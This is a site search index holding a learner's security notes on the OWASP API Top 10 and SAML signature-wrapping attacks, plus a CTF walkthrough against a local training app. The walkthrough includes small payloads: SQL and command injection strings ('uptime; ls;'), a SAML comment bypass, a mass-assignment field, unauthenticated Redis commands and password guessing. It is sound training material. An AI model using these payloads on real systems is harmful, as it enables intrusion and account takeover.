{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to my Internship Ramblings Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam ut congue neque. Nulla aliquam enim lorem, a dignissim justo rhoncus a. Etiam maximus, eros quis venenatis euismod, neque erat auctor augue, non fringilla nibh turpis ac arcu. In pharetra lorem quis ultricies pharetra. Aliquam nec ipsum ultricies, blandit metus nec, tincidunt nulla. Vivamus mollis magna libero, sed volutpat urna facilisis eget. Nam pretium dui vitae nisi dictum, sed tempor turpis hendrerit. In euismod nulla sapien, malesuada molestie urna consectetur vulputate. Cras euismod neque in aliquam luctus.","title":"Home"},{"location":"#welcome-to-my-internship-ramblings","text":"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam ut congue neque. Nulla aliquam enim lorem, a dignissim justo rhoncus a. Etiam maximus, eros quis venenatis euismod, neque erat auctor augue, non fringilla nibh turpis ac arcu. In pharetra lorem quis ultricies pharetra. Aliquam nec ipsum ultricies, blandit metus nec, tincidunt nulla. Vivamus mollis magna libero, sed volutpat urna facilisis eget. Nam pretium dui vitae nisi dictum, sed tempor turpis hendrerit. In euismod nulla sapien, malesuada molestie urna consectetur vulputate. Cras euismod neque in aliquam luctus.","title":"Welcome to my Internship Ramblings"},{"location":"OWASP/api/","text":"OWASP TOP 10 API Here lay my notes on the owasp top 10 api. Definitions Object It describes information about a particular thing. A user object might describe roles, names, usernames. A json object describes key-value pairs of information. Authentication It's the process of proving who you said you were when you registered yourself . Tipically done by a username and password. Data It's what information is made up of, data by itself isn't useful. When combined, it becomes information and is then useful. Resources It's the intellectual/physical property of a certain thing, which can be used with a given purpose or not. In the context of web application, a resource can be a scroll page with articles. Rate-Limiting It's how you throttle requests, by blocking them when you receive too many. Function It does a particular action. Its an operation OWASP API TOP 10 Broken Object Level Authorization - It happens when you are able to access an object which you should not have access to. There is nothing wrong with manipulating the id of an object, the problem arises when a given user has the permissions to access an object he should not have permissions to access. Eg: /shop/user?id=1 Broken User Authentication - Its any operation over authentication that allows an attacker to login as someone else. Eg: OR 1=1 -- Excessive Data Exposure - Its the visualization of an object which is to sensitive to show but is perceivable by the users anyhow. Eg: password key-value pair in JSON body. Lack of Resources & Rate Limiting - Its any operation that exceeds the maximum amount of resources a server can provide because there are no restrictions to how many the client can ask. Eg: ?limit=2000000 Broken Function Level Authorization - Its any operation accessed by a user whose permissions should not allow him to access. Eg: /admin/email?deleteEmailName= Mass Assignment - Its legitimate api calls that an attacker shouldn't have access to in any given endpoint. A user can set himself to admin, if an object in the backend exists that checks if the property admin is true, and the attacker sets it to true via the API. Eg: \"admin\":true Security Misconfiguration - Its anything that is misconfigured to allow an attacker access to sensitive information or do sensitive operations. Eg: redis , DELETE on unporposeful endpoint Injection - Its anything that allows code or commands to be injected in a particular sink such as system in python, eval in js/php. Eg: \".phpinfo().\" Improper-Assets-Management - Developers can't rewrite an API because they included new functionality code to the frontend, so they include new versions of their API and new endpoints towards those versions. An attacker can simply change the version of the api by changing the endpoint (v3 => v2), which could allow him access to older less secure features. Eg: /v2/login/ => /v1/login Insufficent Logging & Monitoring - The application does not log anything or few things and that means it won't be aware of any actions uninteded or intended, malicious or unmalicious that the client does. Vulnerable? If a user can access objects he does not have permissions to access, yes. If there's a way a user can login as another user by exploiting a particular authentication vulnerability such as NoSQLi, SQLi, credential stuffing, then yes. If an Object contains sensitive info that should not be shown and a user is able to see it, then yes. If there is no restriction to the ammount of resources a user can ask, then yes. If a user is able to perform an operation he should not have access to, then yes. If the user is able to legitemately manipulate the API to do things he should not do. If there is somekind of misconfiguration that allows user access to sensitive information, then yes. If user input goes to a sink which allows codes or commands to be injected, then yes. If there's an older version of the api that an attacker can shift to, then yes. If the application does not log or logs very few things, then yes. Char49 TIPS 10 - Insufficent Logging & Monitoring Notice the lack of headers, body - In fact, there is no useful information that seems to be logged. 9 - Improper Assets Management. Remember old api endpoints don't necessarily have the same sub-endpoints. 8 - Injection Taking input directly to the terminal It is not the same as running a system function. 7 - Security Misconfigurations Disclosure of sensitive information can can result in mongodb database leak at port 27017, for example. 6 - Mass Assignment Can be used to bolster any type of privilege. 5 - Broken Function Level Authorization Operations that users aren't supposed to execute with their current authorization level 4 - Lack of Resources & Rate-Limit We can increase the limit value in the query string to increase stress on the server 3 - Excessive Data Exposure Rule of thumb: If it's not rendered and is in output, it should be excessive data exposure 2 - Broken User Authentication There are various techniques, but no rate-limit will surely lead to full account takeover. Analyze responses 1 - Broken Object Level Authorization Notice the id change. We shouldn't have the authorization to see those, but we can see them","title":"Api"},{"location":"OWASP/api/#owasp-top-10-api","text":"Here lay my notes on the owasp top 10 api.","title":"OWASP TOP 10 API"},{"location":"OWASP/api/#definitions","text":"","title":"Definitions"},{"location":"OWASP/api/#object","text":"It describes information about a particular thing. A user object might describe roles, names, usernames. A json object describes key-value pairs of information.","title":"Object"},{"location":"OWASP/api/#authentication","text":"It's the process of proving who you said you were when you registered yourself . Tipically done by a username and password.","title":"Authentication"},{"location":"OWASP/api/#data","text":"It's what information is made up of, data by itself isn't useful. When combined, it becomes information and is then useful.","title":"Data"},{"location":"OWASP/api/#resources","text":"It's the intellectual/physical property of a certain thing, which can be used with a given purpose or not. In the context of web application, a resource can be a scroll page with articles.","title":"Resources"},{"location":"OWASP/api/#rate-limiting","text":"It's how you throttle requests, by blocking them when you receive too many.","title":"Rate-Limiting"},{"location":"OWASP/api/#function","text":"It does a particular action. Its an operation","title":"Function"},{"location":"OWASP/api/#owasp-api-top-10","text":"Broken Object Level Authorization - It happens when you are able to access an object which you should not have access to. There is nothing wrong with manipulating the id of an object, the problem arises when a given user has the permissions to access an object he should not have permissions to access. Eg: /shop/user?id=1 Broken User Authentication - Its any operation over authentication that allows an attacker to login as someone else. Eg: OR 1=1 -- Excessive Data Exposure - Its the visualization of an object which is to sensitive to show but is perceivable by the users anyhow. Eg: password key-value pair in JSON body. Lack of Resources & Rate Limiting - Its any operation that exceeds the maximum amount of resources a server can provide because there are no restrictions to how many the client can ask. Eg: ?limit=2000000 Broken Function Level Authorization - Its any operation accessed by a user whose permissions should not allow him to access. Eg: /admin/email?deleteEmailName= Mass Assignment - Its legitimate api calls that an attacker shouldn't have access to in any given endpoint. A user can set himself to admin, if an object in the backend exists that checks if the property admin is true, and the attacker sets it to true via the API. Eg: \"admin\":true Security Misconfiguration - Its anything that is misconfigured to allow an attacker access to sensitive information or do sensitive operations. Eg: redis , DELETE on unporposeful endpoint Injection - Its anything that allows code or commands to be injected in a particular sink such as system in python, eval in js/php. Eg: \".phpinfo().\" Improper-Assets-Management - Developers can't rewrite an API because they included new functionality code to the frontend, so they include new versions of their API and new endpoints towards those versions. An attacker can simply change the version of the api by changing the endpoint (v3 => v2), which could allow him access to older less secure features. Eg: /v2/login/ => /v1/login Insufficent Logging & Monitoring - The application does not log anything or few things and that means it won't be aware of any actions uninteded or intended, malicious or unmalicious that the client does.","title":"OWASP API TOP 10"},{"location":"OWASP/api/#vulnerable","text":"If a user can access objects he does not have permissions to access, yes. If there's a way a user can login as another user by exploiting a particular authentication vulnerability such as NoSQLi, SQLi, credential stuffing, then yes. If an Object contains sensitive info that should not be shown and a user is able to see it, then yes. If there is no restriction to the ammount of resources a user can ask, then yes. If a user is able to perform an operation he should not have access to, then yes. If the user is able to legitemately manipulate the API to do things he should not do. If there is somekind of misconfiguration that allows user access to sensitive information, then yes. If user input goes to a sink which allows codes or commands to be injected, then yes. If there's an older version of the api that an attacker can shift to, then yes. If the application does not log or logs very few things, then yes.","title":"Vulnerable?"},{"location":"OWASP/api/#char49-tips","text":"","title":"Char49 TIPS"},{"location":"OWASP/api/#10-insufficent-logging-monitoring","text":"Notice the lack of headers, body - In fact, there is no useful information that seems to be logged.","title":"10 - Insufficent Logging &amp; Monitoring"},{"location":"OWASP/api/#9-improper-assets-management","text":"Remember old api endpoints don't necessarily have the same sub-endpoints.","title":"9 - Improper Assets Management."},{"location":"OWASP/api/#8-injection","text":"Taking input directly to the terminal It is not the same as running a system function.","title":"8 - Injection"},{"location":"OWASP/api/#7-security-misconfigurations","text":"Disclosure of sensitive information can can result in mongodb database leak at port 27017, for example.","title":"7 - Security Misconfigurations"},{"location":"OWASP/api/#6-mass-assignment","text":"Can be used to bolster any type of privilege.","title":"6 - Mass Assignment"},{"location":"OWASP/api/#5-broken-function-level-authorization","text":"Operations that users aren't supposed to execute with their current authorization level","title":"5 - Broken Function Level Authorization"},{"location":"OWASP/api/#4-lack-of-resources-rate-limit","text":"We can increase the limit value in the query string to increase stress on the server","title":"4 - Lack of Resources &amp; Rate-Limit"},{"location":"OWASP/api/#3-excessive-data-exposure","text":"Rule of thumb: If it's not rendered and is in output, it should be excessive data exposure","title":"3 - Excessive Data Exposure"},{"location":"OWASP/api/#2-broken-user-authentication","text":"There are various techniques, but no rate-limit will surely lead to full account takeover. Analyze responses","title":"2 - Broken User Authentication"},{"location":"OWASP/api/#1-broken-object-level-authorization","text":"Notice the id change. We shouldn't have the authorization to see those, but we can see them","title":"1 - Broken Object Level Authorization"},{"location":"SAML/saml_notes/","text":"SAML What is it It allows access to multiple websites with only one set of login credentials . It's based on XML . The user is authenticated by sending his login credentials to an idP (identity provider), which responds with a saml request that is sent to the browser, and from there the saml request is sent and validated by the sp . Flow user accesses sp which uses idp for authentication web app responds with a saml request browser forwards saml to the idp idp parses/authenticates the user idp sends request to browser again browser sends generated saml to sp if saml is verified, access is granted Important I can hijack a user's session if I capture the token sent to the sp for validation Attacker's Perspective Timestamp - Messages can be expired or not, and we can tamper with that. Assertion unique ID - Only one session should be opened with the unique ID. If more than one is allowed, we can use the session at the same time the user operates it. Self Signed Certificates - We can clone the original one or self sign our own Missing signatures - Allow tampering with permissions in sp SAML recipient differ - Allows an application user to login to other application. As an attacker this means compromising app A can lead to compromising app B. XSW - Behavior from multiple signatures/assertions XSW 1 - Unsigned copy of the response after signature XSW2 - Same but before signature XSW 3 - Copy of assertion before signature XSW 4 - Copy of assertion after signature XSW 5 - Change value of original assertion, add copy of original assertion without signature at the end of saml response. XSW 6 - Change value of original assertion, add copy of original assertion without signature after the original signature XWS 7 - Add extension block XSW 8 - Add object block. Exploiting Change expiration Modify Parameters XSW Attempt to create a valid signature References https://cwe.mitre.org/data/definitions/287.html https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/ https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html Damn Vulnerable SAML Application The idp server runs at 127.0.0.1 The sp server runs at 127.0.0.1:8000 There's a single logout feature The application allows to change default security configurations like the message and assertion encryption/signing The application has the following exploit scenarios: escalate privileges, employ XSW, use a self sign certificate, remove signing, change timestamps, XXE and XST This can all be done as according to any other SAML configuration via a burp extension: SAML Raider. Scenarios No security configuration Valid Assertions/Messages Messages/Assertions signed Messages/Assertions signed and valid No security configuration: Without security configuration, it is possible to edit the saml response in anyway we can. To escalate privileges, we can simply change the memberOf attribute in the SAML response to administrators . After accessing the complaints tab, the gui should allow us to delete users. Valid Assertions/Messages: The configuration wants valid assertions and messages, but only checks if they are valid if a signature exists. This means removing the signature permits editing the assertions and escalating our privileges. After removing the signature in SAML Raider , change the memberOf attribute to administrators . Access the complaints tab and the GUI should allow deletion of complaints. Messages/Assertions Signed In this situation, the application checks that the SAML is signed, but it does not validate the assertion. An attacker can edit the assertion and change the group membership by editing the memberOf attribute to administrators . Messages/Assertions signed and valid. In this application, the only bypass is by leveraging CVE-2017-11427 . This CVE plays with the parsing of the XML to trick the application into thinking we did not alter anything in the SAML response, but in fact we did. We can do this by adding a comment to the memberOf attribute after administrators: administrators<!--butnot--> SAML Raider It automates XSW attacks, attempts XXE and XST, allows inserting custom self signed certificates and remove signings.","title":"SAML"},{"location":"SAML/saml_notes/#saml","text":"","title":"SAML"},{"location":"SAML/saml_notes/#what-is-it","text":"It allows access to multiple websites with only one set of login credentials . It's based on XML . The user is authenticated by sending his login credentials to an idP (identity provider), which responds with a saml request that is sent to the browser, and from there the saml request is sent and validated by the sp .","title":"What is it"},{"location":"SAML/saml_notes/#flow","text":"user accesses sp which uses idp for authentication web app responds with a saml request browser forwards saml to the idp idp parses/authenticates the user idp sends request to browser again browser sends generated saml to sp if saml is verified, access is granted","title":"Flow"},{"location":"SAML/saml_notes/#important","text":"I can hijack a user's session if I capture the token sent to the sp for validation","title":"Important"},{"location":"SAML/saml_notes/#attackers-perspective","text":"Timestamp - Messages can be expired or not, and we can tamper with that. Assertion unique ID - Only one session should be opened with the unique ID. If more than one is allowed, we can use the session at the same time the user operates it. Self Signed Certificates - We can clone the original one or self sign our own Missing signatures - Allow tampering with permissions in sp SAML recipient differ - Allows an application user to login to other application. As an attacker this means compromising app A can lead to compromising app B. XSW - Behavior from multiple signatures/assertions XSW 1 - Unsigned copy of the response after signature XSW2 - Same but before signature XSW 3 - Copy of assertion before signature XSW 4 - Copy of assertion after signature XSW 5 - Change value of original assertion, add copy of original assertion without signature at the end of saml response. XSW 6 - Change value of original assertion, add copy of original assertion without signature after the original signature XWS 7 - Add extension block XSW 8 - Add object block.","title":"Attacker's Perspective"},{"location":"SAML/saml_notes/#exploiting","text":"Change expiration Modify Parameters XSW Attempt to create a valid signature","title":"Exploiting"},{"location":"SAML/saml_notes/#references","text":"https://cwe.mitre.org/data/definitions/287.html https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/ https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html","title":"References"},{"location":"SAML/saml_notes/#damn-vulnerable-saml-application","text":"The idp server runs at 127.0.0.1 The sp server runs at 127.0.0.1:8000 There's a single logout feature The application allows to change default security configurations like the message and assertion encryption/signing The application has the following exploit scenarios: escalate privileges, employ XSW, use a self sign certificate, remove signing, change timestamps, XXE and XST This can all be done as according to any other SAML configuration via a burp extension: SAML Raider.","title":"Damn Vulnerable SAML Application"},{"location":"SAML/saml_notes/#scenarios","text":"No security configuration Valid Assertions/Messages Messages/Assertions signed Messages/Assertions signed and valid No security configuration: Without security configuration, it is possible to edit the saml response in anyway we can. To escalate privileges, we can simply change the memberOf attribute in the SAML response to administrators . After accessing the complaints tab, the gui should allow us to delete users. Valid Assertions/Messages: The configuration wants valid assertions and messages, but only checks if they are valid if a signature exists. This means removing the signature permits editing the assertions and escalating our privileges. After removing the signature in SAML Raider , change the memberOf attribute to administrators . Access the complaints tab and the GUI should allow deletion of complaints. Messages/Assertions Signed In this situation, the application checks that the SAML is signed, but it does not validate the assertion. An attacker can edit the assertion and change the group membership by editing the memberOf attribute to administrators . Messages/Assertions signed and valid. In this application, the only bypass is by leveraging CVE-2017-11427 . This CVE plays with the parsing of the XML to trick the application into thinking we did not alter anything in the SAML response, but in fact we did. We can do this by adding a comment to the memberOf attribute after administrators: administrators<!--butnot-->","title":"Scenarios"},{"location":"SAML/saml_notes/#saml-raider","text":"It automates XSW attacks, attempts XXE and XST, allows inserting custom self signed certificates and remove signings.","title":"SAML Raider"},{"location":"ctfs/capital-ctf/","text":"Writeup c{api}talctf This ctf is a training done by checkmarx to introduce people to API hacking in a gentle way. Kudos. Checkmarx. Definitions Functional View - What is it? This form of recon ascertains the functionality of the web app. For example, what is the website's purpose? Does it have login capabilities? If so, can I register an account? What can I do upon logging in? This is a very important phase of the recon process. You won't break anything if you don't understand how it was built. Technological View - What is it? This is the next phase after the functional view of the recon process. Purposefuly made to acquire information related to technology. Which server hosts the app? Is there a framework linked to that? What ports are open? Is it the same server running on that port? Does it have an API? What's the backend language? OSINT View - What is it? This is my final phase of the recon process. It's about researching of the technologies and functionalities discovered before. If it's using FastAPI, for example, are there any default config, db, env files? Basically, google to find open source intelligence information about my discoveries. Recon localhost:4100 Functional View Home Page The main page is a feed with posts from various different users. Tags will filter the posts. Reading every post is very important to attain information. By clicking on the Dev Updates #4 , I read there are unsecured endpoints. (DevOps and Administrative endpoints). After clicking on the post I am Pikachu! , I see there is an email: Pikachu@checkmarx.com . Sign up Page In order to sign up, I need a username , a email and a password . I create my account and it automatically logs me in. Settings Page It allows me to set an image, change my username, email, password, set a bio and logout. New Post Page It allows me to create an article which is composed by a title , summary , write an article in markdown and add tags which can be used for filtering purposes. My Profile Page It simple shows my articles and favorited articles. Technological View The most common way to acquire technology information about the target is to analyze headers and produce errors. Maybe a null byte (It's keen to a stop sign. It will stop, in this case, the processing of the string), in the url will produce a 500 that leaks information about the backend? A simple head request could return a Server header. It is important to emphasize that the information can be faked. It is the responsability of the researcher to understand what is true and what is not. Curling the root of the url, http://localhost:4100/ , the X-Powered-By header is present with a value of Express . This means javascript could be running on the backend of the server at port 4100. To confirm that, I open the source code, since there could be another hint to another backend server. Nothing hints at another server but an interesting file is found: http://localhost:4100/static/js/bundle.js I take note of it and continue curl a page I knew did not exist: http://curl -I localhost:4100/123 The same header is present. I run an nmap to find which ports are open that server: nmap -sS -sV -p- --min-rate=500 localhost . This scan basically initiates a connection and ends it halfway, discovering if the port is open or not, due to the server's response halfway through the connection. There are various ports open but the one which interests me more is 8000 and 6379 OSINT View I start googling for sensitive files express could have. (Config files, env files, db files, etc). But quickly find out most of express's configuration is done via the terminal, and that express is simply a framework to create web applications and apis, and as such does not come with default configuration files that you can access via the http protocol. localhost:8000 Functional View The nmap scan shows us it's an http server, therefore it can be opened in a browser. It returns a 404 status code, implying there is no route for GET at / . Going a step back, I re-opened the application at 4100 and opened up BurpSuite. (It's an application which allows me to \"grab\" or intercept a network request, edit it, and then send it off again.). With intercept mode on, I login and see it makes a request to the same host at port 8000 on an endpoint /api . This means the frontend (blog) communicates with the backend through the API. Everything goes to the API before going to the backend. The though process now is to use the functionalities of the web application, whilst intercept is on, to see how communication is done with the API. By clicking on the homepage, I see it makes a request to the same server at port 8000 on the endpoint /api/articles?limit=10&offset=0 So it may not be a paged file but instead a scroll file. The limit is the maximum ammount of articles which can appear and the offset is from which article to show. By clicking on my profile I see it makes a request to /api/profiles/android and that shows interesting json attributes: admin , cardName , cardNumber , cardCvc , cardExpiry Updating my profile sends a PUT request to /api/user/ with a json body. By creating an article I see it makes a POST request to /api/articles with a json body again. Cicking on a post sends a GET to /api/articles/<post_name> Taking into account the requests it just made to the API, I can conclude it is using an API of type REST, because it's using the whole of the http protocol to communicate throughout different endpoints. Technological View. Curling with a head request at http://localhost:8000 , I see it uses a server called uvicorn . Another curl head request to a 404 directory on that server: http://localhost:8000/123 . It also shows uvicorn. OSINT View After googling what uvicorn is, I see its a python based server for the ASGI specification. Its basically an asynchronous web server. It can use various API frameworks. After googling for specific endpoints for each framework, I find one that returns a 200. It is /docs . It simply compiles the information from openapi.json into a more familiar and readable format. To be truthful, /docs is a very common endpoint, but, in this case, means the framework is utilizing FastAPI . Exploitation First Flag Whilst analyzing the docs, I notice an admin attribute at /api/user . This means, according to the API, there is an attribute admin linked to the backend code, which, when set, will make me admin . Basically, logically speaking, somewhere in the backend, there is a conditional check keen to: if(user.admin) { admin stuff } . Go to settings page of the frontend. Click update settings with intercept on. Write in json format the following json key-pair value: \"admin\":true to the body of the json request. Send it off. You are now admin The flag is: flag{M4sS_AsS1gnm3nt} - Belongs to: Mass Assignment Do not let the user change its own role, especially to roles with higher privileges. Second Flag The next endpoint at the docs which seems interesting is the /api/debug/ endpoint. By the looks of it, it sends a command, by default, uptime to the server. It is a linux command, which implies that, most likely, since its python, there is a system function call with user input in it. We can injection arbitrary shell functions then. See it as a connection between your computer and the API. Everything in that input will be seen by the computer as a command. Copy the default body from /docs and paste it onto the repeater. Replace uptime with uptime; ls; and a flag is received. It is: flag{1nject10n_Ap1} - Belongs to: Injection Do not use the system function. More clearly, do not send user input to functions which allow execution of commands. Third Flag Taking a peak at the docs, I see endpoints, which, when receiving a DELETE request, will delete an article or comment. The thought process here is, according to the logic of the application, that a normal registered user shouldn't be able to delete other user's privilege. An admin? Sure. But a regular user? Is it really necessary to allow a regular user to delete other's comments and articles?. Stop being admin by sending a PUT request to /api/user but with admin set to false. (Like we did the last time, intercept the request at /settings and add a json attribute like: \"admin\":false ). It allows the request and deletes the article. This means that in the backend there is code which does not validate the permissions correctly. Maybe the regular-user and admin-user classes both inherit from User and it was forgotten to unvalidate some permissions? Re-devoloping the code isn't a good idea. You can simply check if a user is admin, and if so, allows the request to delete other user's articles and comments. If not, it only allows to delete his own articles. The flag is: flag{B0lA!!!!!} - Belongs to: Broken Object Level Authorization Fourth Flag There's another port open. It is: 6379 . It's hosting redis, a database. Redis-cli is a command line program to communicate with it. Simply open a terminal, write redis-cli -h 127.0.0.1 and notice a database shell opens. Redis uses keyspaces to enumerate existing db's. That is, keyspace 0 means there is a db 0. To do that, write INFO keyspace . It will output the number of the database you need to select. Take into account this is only possible because there is no user authentication. The security misconfiguration happens because an attacker can interact with the server without authentication. Write SELECT 0 and enumerate all the keys with KEYS * . There's one called flag. Get it with GET flag . The flag is: flag{5eC_M1sc0nF1g} - Belongs to: Security Misconfiguration Fifth Flag If you provide a way to associate sentitive info with a profile, do not show that sensitive info in the API or frontend. Keep it in the backend. And if you do decide to show it, show only to the current user. Noticing the user's profile's returns card info, and that one user told he was giving away money, I concluded he had associated his card info. As such I did a GET to /api/profiles/TeamR$cket and there it was, his credit card info. I remembered the membership options and decided to test his card there. It worked a flag popped up. It is: flag{3xc3ss1v3_daTa_Xp0sur3} - Belongs to: Excessive Data Exposure Sixth Flag Most users re-use passwords and use passwords with personal information. In this case, the user Pikachu made a post with his favorite pokemons. Deductive reasoning led me to believe it could be one of his passwords. After placing the pokemon list on intruder and attempting each one to login, the last one let me in. The password is snorlax and the flag is: flag{br0k3n_uS3r_4uthEnt1cAt1oN} - Belongs to: Broken User Authentication Locking the account after 3-5 failed login attempts should fix this. You can't allow a user to bruteforce his way through your login system, as that will lead to a broken authentication system. Seventh Flag After logging on Pikachu, we can see there's a logging endpoint. We test it on the frontend and a message is displayed saying there is no logging or monitoring. We test it on the backend/API and we get a flag: flag{InsUfF1C3nT_L0gG1nG} - Belongs to: Insufficient Logging Lack of logging is problematic. You want to know who logged in and where, who takes action X or not. Logs are important to keep track of everything that happens in the application. Eighth Flag There's a post by Hodor which says there are administrative endpoints. We test it on the frontend with /admin/ and it is deprecated. We test it on the backend/API with /api/admin and we get a flag! flag{BFL4_I_aM_Th3_aDm1n_H3r3!} - Belongs to: Broken Function Level Authorization A normal user should not be allowed to access administrative endpoints, the backend code needs to make a check which looks at the user's roles and see's if it has the necessary ones to enter an admin endpoint: if(user.admin) { allow } else { do not } Ninth Flag Scrolling pages need to have a defined limit, a maximum number of articles, in this case, that it shows. Otherwise you can stress the database by asking too many, leading to a DoS. The limit parameter, in this case, we can change it to 200000 and we provoke rate-limiting issues and thus we get the flag: flag{L4cK_0f_R3s0urc3S_&_r4t3_L1m1t1ng} - Belongs to: Lack of Resources & Rate-Limiting Tenth Flag Developers often need to re-write parts of an API because they add new functionality to the frontend and need a way to communicate with the backend. Thus leading to a new directory, for example, v3 with the updated API. Forgetting to forbid access to the lower API versions could lead to security risks, as unpatched API is more prone to security issues and misconfigurations. Improser-Assets-Mangement, we can see the login endpoint has a v2. We attempt to use v1 and login. It works and the flag is there. It is: flag{Impr0peR_Ass3ts_ManAg3m3nt} - Belongs to: Improper Assets Mangement","title":"Index"},{"location":"ctfs/capital-ctf/#writeup-capitalctf","text":"This ctf is a training done by checkmarx to introduce people to API hacking in a gentle way. Kudos. Checkmarx.","title":"Writeup c{api}talctf"},{"location":"ctfs/capital-ctf/#definitions","text":"","title":"Definitions"},{"location":"ctfs/capital-ctf/#functional-view-what-is-it","text":"This form of recon ascertains the functionality of the web app. For example, what is the website's purpose? Does it have login capabilities? If so, can I register an account? What can I do upon logging in? This is a very important phase of the recon process. You won't break anything if you don't understand how it was built.","title":"Functional View - What is it?"},{"location":"ctfs/capital-ctf/#technological-view-what-is-it","text":"This is the next phase after the functional view of the recon process. Purposefuly made to acquire information related to technology. Which server hosts the app? Is there a framework linked to that? What ports are open? Is it the same server running on that port? Does it have an API? What's the backend language?","title":"Technological View - What is it?"},{"location":"ctfs/capital-ctf/#osint-view-what-is-it","text":"This is my final phase of the recon process. It's about researching of the technologies and functionalities discovered before. If it's using FastAPI, for example, are there any default config, db, env files? Basically, google to find open source intelligence information about my discoveries.","title":"OSINT View - What is it?"},{"location":"ctfs/capital-ctf/#recon","text":"localhost:4100","title":"Recon"},{"location":"ctfs/capital-ctf/#functional-view","text":"Home Page The main page is a feed with posts from various different users. Tags will filter the posts. Reading every post is very important to attain information. By clicking on the Dev Updates #4 , I read there are unsecured endpoints. (DevOps and Administrative endpoints). After clicking on the post I am Pikachu! , I see there is an email: Pikachu@checkmarx.com . Sign up Page In order to sign up, I need a username , a email and a password . I create my account and it automatically logs me in. Settings Page It allows me to set an image, change my username, email, password, set a bio and logout. New Post Page It allows me to create an article which is composed by a title , summary , write an article in markdown and add tags which can be used for filtering purposes. My Profile Page It simple shows my articles and favorited articles.","title":"Functional View"},{"location":"ctfs/capital-ctf/#technological-view","text":"The most common way to acquire technology information about the target is to analyze headers and produce errors. Maybe a null byte (It's keen to a stop sign. It will stop, in this case, the processing of the string), in the url will produce a 500 that leaks information about the backend? A simple head request could return a Server header. It is important to emphasize that the information can be faked. It is the responsability of the researcher to understand what is true and what is not. Curling the root of the url, http://localhost:4100/ , the X-Powered-By header is present with a value of Express . This means javascript could be running on the backend of the server at port 4100. To confirm that, I open the source code, since there could be another hint to another backend server. Nothing hints at another server but an interesting file is found: http://localhost:4100/static/js/bundle.js I take note of it and continue curl a page I knew did not exist: http://curl -I localhost:4100/123 The same header is present. I run an nmap to find which ports are open that server: nmap -sS -sV -p- --min-rate=500 localhost . This scan basically initiates a connection and ends it halfway, discovering if the port is open or not, due to the server's response halfway through the connection. There are various ports open but the one which interests me more is 8000 and 6379","title":"Technological View"},{"location":"ctfs/capital-ctf/#osint-view","text":"I start googling for sensitive files express could have. (Config files, env files, db files, etc). But quickly find out most of express's configuration is done via the terminal, and that express is simply a framework to create web applications and apis, and as such does not come with default configuration files that you can access via the http protocol. localhost:8000","title":"OSINT View"},{"location":"ctfs/capital-ctf/#functional-view_1","text":"The nmap scan shows us it's an http server, therefore it can be opened in a browser. It returns a 404 status code, implying there is no route for GET at / . Going a step back, I re-opened the application at 4100 and opened up BurpSuite. (It's an application which allows me to \"grab\" or intercept a network request, edit it, and then send it off again.). With intercept mode on, I login and see it makes a request to the same host at port 8000 on an endpoint /api . This means the frontend (blog) communicates with the backend through the API. Everything goes to the API before going to the backend. The though process now is to use the functionalities of the web application, whilst intercept is on, to see how communication is done with the API. By clicking on the homepage, I see it makes a request to the same server at port 8000 on the endpoint /api/articles?limit=10&offset=0 So it may not be a paged file but instead a scroll file. The limit is the maximum ammount of articles which can appear and the offset is from which article to show. By clicking on my profile I see it makes a request to /api/profiles/android and that shows interesting json attributes: admin , cardName , cardNumber , cardCvc , cardExpiry Updating my profile sends a PUT request to /api/user/ with a json body. By creating an article I see it makes a POST request to /api/articles with a json body again. Cicking on a post sends a GET to /api/articles/<post_name> Taking into account the requests it just made to the API, I can conclude it is using an API of type REST, because it's using the whole of the http protocol to communicate throughout different endpoints.","title":"Functional View"},{"location":"ctfs/capital-ctf/#technological-view_1","text":"Curling with a head request at http://localhost:8000 , I see it uses a server called uvicorn . Another curl head request to a 404 directory on that server: http://localhost:8000/123 . It also shows uvicorn.","title":"Technological View."},{"location":"ctfs/capital-ctf/#osint-view_1","text":"After googling what uvicorn is, I see its a python based server for the ASGI specification. Its basically an asynchronous web server. It can use various API frameworks. After googling for specific endpoints for each framework, I find one that returns a 200. It is /docs . It simply compiles the information from openapi.json into a more familiar and readable format. To be truthful, /docs is a very common endpoint, but, in this case, means the framework is utilizing FastAPI .","title":"OSINT View"},{"location":"ctfs/capital-ctf/#exploitation","text":"","title":"Exploitation"},{"location":"ctfs/capital-ctf/#first-flag","text":"Whilst analyzing the docs, I notice an admin attribute at /api/user . This means, according to the API, there is an attribute admin linked to the backend code, which, when set, will make me admin . Basically, logically speaking, somewhere in the backend, there is a conditional check keen to: if(user.admin) { admin stuff } . Go to settings page of the frontend. Click update settings with intercept on. Write in json format the following json key-pair value: \"admin\":true to the body of the json request. Send it off. You are now admin The flag is: flag{M4sS_AsS1gnm3nt} - Belongs to: Mass Assignment Do not let the user change its own role, especially to roles with higher privileges.","title":"First Flag"},{"location":"ctfs/capital-ctf/#second-flag","text":"The next endpoint at the docs which seems interesting is the /api/debug/ endpoint. By the looks of it, it sends a command, by default, uptime to the server. It is a linux command, which implies that, most likely, since its python, there is a system function call with user input in it. We can injection arbitrary shell functions then. See it as a connection between your computer and the API. Everything in that input will be seen by the computer as a command. Copy the default body from /docs and paste it onto the repeater. Replace uptime with uptime; ls; and a flag is received. It is: flag{1nject10n_Ap1} - Belongs to: Injection Do not use the system function. More clearly, do not send user input to functions which allow execution of commands.","title":"Second Flag"},{"location":"ctfs/capital-ctf/#third-flag","text":"Taking a peak at the docs, I see endpoints, which, when receiving a DELETE request, will delete an article or comment. The thought process here is, according to the logic of the application, that a normal registered user shouldn't be able to delete other user's privilege. An admin? Sure. But a regular user? Is it really necessary to allow a regular user to delete other's comments and articles?. Stop being admin by sending a PUT request to /api/user but with admin set to false. (Like we did the last time, intercept the request at /settings and add a json attribute like: \"admin\":false ). It allows the request and deletes the article. This means that in the backend there is code which does not validate the permissions correctly. Maybe the regular-user and admin-user classes both inherit from User and it was forgotten to unvalidate some permissions? Re-devoloping the code isn't a good idea. You can simply check if a user is admin, and if so, allows the request to delete other user's articles and comments. If not, it only allows to delete his own articles. The flag is: flag{B0lA!!!!!} - Belongs to: Broken Object Level Authorization","title":"Third 